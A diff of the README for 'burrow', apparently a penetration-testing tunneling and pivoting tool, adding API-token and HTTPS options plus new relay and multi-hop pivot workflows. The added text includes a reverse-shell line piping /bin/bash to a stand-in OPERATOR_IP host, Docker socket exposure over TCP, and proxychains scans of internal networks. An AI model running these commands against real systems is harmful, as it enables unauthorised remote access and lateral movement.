@@ -155,19 +155,22 @@ On disconnect, the agent sleeps and retries. With `--retry 0`, it retries indefi
 
 ### `burrow session list`
 
-List all active agent sessions. Queries the WebUI REST API at `/api/sessions`. The server must be running with `--mcp-api`.
+List all active agent sessions. Queries the WebUI REST API at `/api/sessions`. The server must be running with `--webui`.
 
 **Flags:**
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--webui` | `127.0.0.1:9090` | WebUI server address |
+| `--webui` | `127.0.0.1:9090` | WebUI server address (persistent flag on `session` command) |
+| `--token` | | API authentication token |
+| `--no-tls` | | Use plain HTTP instead of HTTPS (default: use HTTPS) |
 
 **Example:**
 
 ```bash
-burrow session list
-burrow session list --webui 127.0.0.1:9090
+burrow session list --token <api-token>
+burrow session list --token <api-token> --webui 127.0.0.1:9090
+burrow session list --token <api-token> --no-tls --webui 127.0.0.1:9090
 ```
 
 **Expected output:**
@@ -188,12 +191,14 @@ Show detailed information about a specific session, including active tunnels and
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--webui` | `127.0.0.1:9090` | WebUI server address |
+| `--webui` | `127.0.0.1:9090` | WebUI server address (persistent flag on `session` command) |
+| `--token` | | API authentication token |
+| `--no-tls` | | Use plain HTTP instead of HTTPS (default: use HTTPS) |
 
 **Example:**
 
 ```bash
-burrow session info session-abc123
+burrow session info session-abc123 --token <api-token>
 ```
 
 **Expected output:**
@@ -227,12 +232,14 @@ Enter an interactive REPL for managing a specific session. The prompt is `burrow
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--webui` | `127.0.0.1:9090` | WebUI server address |
+| `--webui` | `127.0.0.1:9090` | WebUI server address (persistent flag on `session` command) |
+| `--token` | | API authentication token |
+| `--no-tls` | | Use plain HTTP instead of HTTPS (default: use HTTPS) |
 
 **Example:**
 
 ```bash
-burrow session use session-abc123
+burrow session use session-abc123 --token <api-token>
 ```
 
 **Interactive commands:**
@@ -569,23 +576,67 @@ burrow relay udp-listen:5353 udp-connect:8.8.8.8:53
 
 ---
 
+### Complete Relay Workflow
+
+#### TCP relay bridging two networks
+
+```bash
+# Expose an internal service (10.0.0.5:80) on the operator's port 8080
+burrow relay tcp-listen:8080 tcp-connect:10.0.0.5:80
+
+# Now connect from anywhere:
+curl http://127.0.0.1:8080/
+```
+
+#### Unix socket exposure over TCP
+
+```bash
+# Expose a local Unix socket (e.g. Docker daemon) over TCP
+burrow relay tcp-listen:2375 unix-connect:/var/run/docker.sock
+
+# Use it remotely:
+docker -H tcp://127.0.0.1:2375 ps
+```
+
+#### Exec relay for reverse shells
+
+```bash
+# Operator: listen for incoming shell
+burrow relay tcp-listen:4444 stdio
+
+# Target: send shell back
+burrow relay stdio tcp-connect:OPERATOR_IP:4444
+# Then pipe a shell: /bin/bash -i | burrow relay stdio tcp-connect:OPERATOR_IP:4444
+```
+
+#### Chaining relay with tunnel
+
+```bash
+# Step 1: forward agent session tunnel to local port
+# (inside burrow session use)
+burrow> tunnel add local 127.0.0.1:9000 10.0.0.5:8080
+
+# Step 2: relay that local port to another internal host
+burrow relay tcp-listen:9001 tcp-connect:127.0.0.1:9000
+```
+
 ## Typical Workflows
 
 ### Agent-Based Tunneling
 
 ```bash
-# Operator: start server with WebUI and API Authentication
-burrow server --mcp-api
-# Note the fingerprint and API Token printed on startup
+# Operator: start server with WebUI
+burrow server --webui
+# Note the fingerprint and API token printed on startup
 
-# Target machine: run agent
+# Target: run agent
 burrow agent --connect OPERATOR_IP:11601 --fingerprint SHA256:a3f2c1...
 
-# Operator: list sessions
-burrow session list --webui 127.0.0.1:9090
+# Operator: list sessions (use the token from server output)
+burrow session list --token <api-token>
 
-# Operator: manage a session interactively
-burrow session use SESSION_ID
+# Operator: manage session interactively
+burrow session use SESSION_ID --token <api-token>
 
 burrow> tunnel add local 127.0.0.1:8080 10.0.0.5:80
 burrow> route add 10.0.0.0/24
@@ -641,11 +692,75 @@ proxychains nmap -sT -p 22,80,443 10.0.0.0/24
 
 ---
 
+### Complete Multi-Hop Pivot Workflow
+
+A step-by-step example pivoting through two hops to reach an isolated internal network.
+
+#### Step 1: Enumerate the first network
+
+```bash
+# Scan the first network from the operator machine
+burrow scan --subnet 10.0.0.0/24 --ports 22,80,443,3389,8080
+```
+
+#### Step 2: Drop agent on hop1
+
+```bash
+# Operator: start server
+burrow server --webui
+# Note the fingerprint and token
+
+# On hop1 (10.0.0.5): deploy and run agent
+burrow agent --connect OPERATOR_IP:11601 --fingerprint SHA256:a3f2c1...
+```
+
+#### Step 3: Scan internal network through hop1
+
+```bash
+# Add a route through the hop1 session so operator can reach 192.168.1.0/24
+burrow session use SESSION_HOP1 --token <api-token>
+burrow> route add 192.168.1.0/24
+
+# Now scan the internal network (traffic routes through the agent)
+burrow scan --subnet 192.168.1.0/24 --ports 22,80,443,3306,5432
+```
+
+#### Step 4: Set up pivot chain through hop1 to hop2
+
+```bash
+# Chain: operator -> hop1 (10.0.0.5:22) -> hop2 (192.168.1.20:22) -> final target
+burrow pivot --target 172.16.0.0 --port 443 \
+  --hop 10.0.0.5:22 \
+  --hop 192.168.1.20:22 \
+  --local-port 1080
+```
+
+#### Step 5: Open SOCKS5 through the chain
+
+```bash
+# The --local-port 1080 above already opens a SOCKS5 entry point.
+# Alternatively, start a dedicated SOCKS5 proxy:
+burrow proxy socks5 --listen 127.0.0.1:1080
+```
+
+#### Step 6: Run tools through proxychains
+
+```bash
+# Configure proxychains to use 127.0.0.1:1080
+# /etc/proxychains4.conf: socks5 127.0.0.1 1080
+
+proxychains nmap -sT -p 22,80,443,3306 172.16.0.0/24
+proxychains curl http://172.16.0.10/admin
+proxychains ssh user@172.16.0.10
+```
+
 ## WebUI Dashboard
 
-Enabled with `--webui` on the server. Accessible at `http://127.0.0.1:9090` by default (or the address set with `--webui`).
+Enabled with `--webui` on the server. The server defaults to HTTPS with a self-signed certificate. On startup, the WebUI URL is printed with the API token embedded as a query parameter for easy browser access.
 
 Built with Alpine.js and Pico CSS. Provides a live session list, tunnel management, and route management. The `GET /api/events` endpoint is a Server-Sent Events stream for live updates.
+
+The `session` CLI commands (`list`, `info`, `use`) default to HTTPS and require `--token` for authentication. Use `--no-tls` if running the WebUI without TLS.
 
 ### REST API
 
@@ -690,25 +805,30 @@ All endpoints return JSON.
 
 ```bash
 # List sessions
-curl -H "Authorization: Bearer <token>" http://127.0.0.1:9090/api/sessions
+curl -k -H "Authorization: Bearer <token>" https://127.0.0.1:9090/api/sessions
 
 # Create a tunnel
-curl -X POST http://127.0.0.1:9090/api/sessions/session-abc123/tunnels \
+curl -k -X POST https://127.0.0.1:9090/api/sessions/session-abc123/tunnels \
   -H "Authorization: Bearer <token>" \
   -H 'Content-Type: application/json' \
   -d '{"direction":"local","listen":"127.0.0.1:8080","remote":"10.0.0.5:80","protocol":"tcp"}'
 
 # Add a route
-curl -X POST http://127.0.0.1:9090/api/sessions/session-abc123/routes \
+curl -k -X POST https://127.0.0.1:9090/api/sessions/session-abc123/routes \
   -H "Authorization: Bearer <token>" \
   -H 'Content-Type: application/json' \
   -d '{"cidr":"10.0.0.0/24"}'
 
 # Remove a tunnel
-curl -X DELETE http://127.0.0.1:9090/api/sessions/session-abc123/tunnels/tun-001
+curl -k -X DELETE https://127.0.0.1:9090/api/sessions/session-abc123/tunnels/tun-001 \
+  -H "Authorization: Bearer <token>"
+
+# Remove a route
+curl -k -X DELETE https://127.0.0.1:9090/api/sessions/session-abc123/routes/10.0.0.0%2F24 \
+  -H "Authorization: Bearer <token>"
 
 # Subscribe to live events
-curl http://127.0.0.1:9090/api/events
+curl -k -H "Authorization: Bearer <token>" https://127.0.0.1:9090/api/events
 ```
 
 ---
@@ -800,7 +920,7 @@ Max payload: 1 MB. All structured payloads are JSON-encoded.
 ~/go1.24/go/bin/go test ./...
 ```
 
-20 packages, all passing.
+21 packages, all passing.
 
 ---
 
